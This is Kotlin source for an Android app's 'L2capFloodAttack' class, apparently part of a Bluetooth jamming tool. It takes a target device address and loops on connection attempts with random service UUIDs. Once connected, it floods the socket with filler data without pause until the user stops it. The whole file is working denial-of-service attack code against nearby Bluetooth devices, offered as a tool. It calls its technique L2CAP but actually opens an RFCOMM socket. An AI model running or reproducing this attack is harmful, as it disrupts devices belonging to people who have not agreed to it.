package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.os.Build
import android.widget.TextView
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat.getSystemService
import com.eikarna.bluetoothjammer.AttackActivity
import com.google.android.material.textview.MaterialTextView
import kotlinx.coroutines.*
import java.io.IOException
import java.util.*
import util.Logger

class L2capFloodAttack(private val targetAddress: String) {
    private var bluetoothAdapter: BluetoothAdapter? = null
    private var l2capSocket: BluetoothSocket? = null
    private var coroutineScope: CoroutineScope? = null

    // Purge oldest messages if the line count exceeds 100
    private fun purgeOldestMessagesIfNeeded(element: TextView) {
        val maxLines = 100
        val lines = element.text.split("\n")
        if (lines.size > maxLines) {
            val newText = lines.takeLast(maxLines).joinToString("\n")
            element.text = newText
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    @SuppressLint("MissingPermission")
    fun startAttack(context: Context, element: MaterialTextView) {
        coroutineScope = CoroutineScope(Dispatchers.IO)
        val bluetoothManager: BluetoothManager? = getSystemService(context, BluetoothManager::class.java)
        bluetoothAdapter = bluetoothManager?.adapter
        val device: BluetoothDevice? = bluetoothAdapter?.getRemoteDevice(targetAddress)

        if (device != null) {
            coroutineScope!!.launch {
                var successfulUUID: UUID? = null
                val baseUUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")

                while (true) {
                    val uuid = successfulUUID ?: baseUUID
                    try {
                        // Create socket and connect
                        l2capSocket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                        l2capSocket?.connect()
                        if (l2capSocket?.isConnected == true) {
                            successfulUUID = uuid // Remember successful UUID
                            break // Connection successful
                        }
                    } catch (err: IOException) {
                        // Generate new UUID on failure
                        successfulUUID = UUID.fromString(UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB")
                        if (AttackActivity.loggingStatus) {
                            (context as AttackActivity).runOnUiThread {
                                if (AttackActivity.isAttacking) {
                                    purgeOldestMessagesIfNeeded(element)
                                    Logger.appendLog(element, "Failed to connect..")
                                } else {
                                    cancel()
                                }
                            }
                        }
                    }
                }

                // Proceed with the flood attack if connected
                if (l2capSocket?.isConnected == true) {
                    if (AttackActivity.loggingStatus) {
                        (context as AttackActivity).runOnUiThread {
                            if (AttackActivity.isAttacking) {
                                Logger.appendLog(element, "Connection established.")
                                Logger.appendLog(element, "Sending payload..")
                            }
                            else cancel()
                        }
                        floodAttack()
                    }
                } else {
                    if (AttackActivity.loggingStatus) {
                        (context as AttackActivity).runOnUiThread {
                            if (AttackActivity.isAttacking) {
                                purgeOldestMessagesIfNeeded(element)
                                Logger.appendLog(element, "Connection could not be established.")
                            } else cancel()
                        }
                    }
                }
            }
        }
    }

    private fun floodAttack() {
        val dataSize = l2capSocket?.maxTransmitPacketSize ?: 600
        val sendBuffer = ByteArray(dataSize) { ((it % 40) + 'A'.code.toByte()).toByte() }

        try {
            while (AttackActivity.isAttacking && l2capSocket?.isConnected == true) {
                l2capSocket?.outputStream?.write(sendBuffer)
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    @SuppressLint("MissingPermission")
    fun stopAttack() {
        AttackActivity.isAttacking = false
        coroutineScope?.cancel() // Cancel the coroutine, stopping the attack
        coroutineScope = null
        closeConnection()
        l2capSocket = null
        bluetoothAdapter?.startDiscovery()
    }

    private fun closeConnection() {
        try {
            l2capSocket?.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}
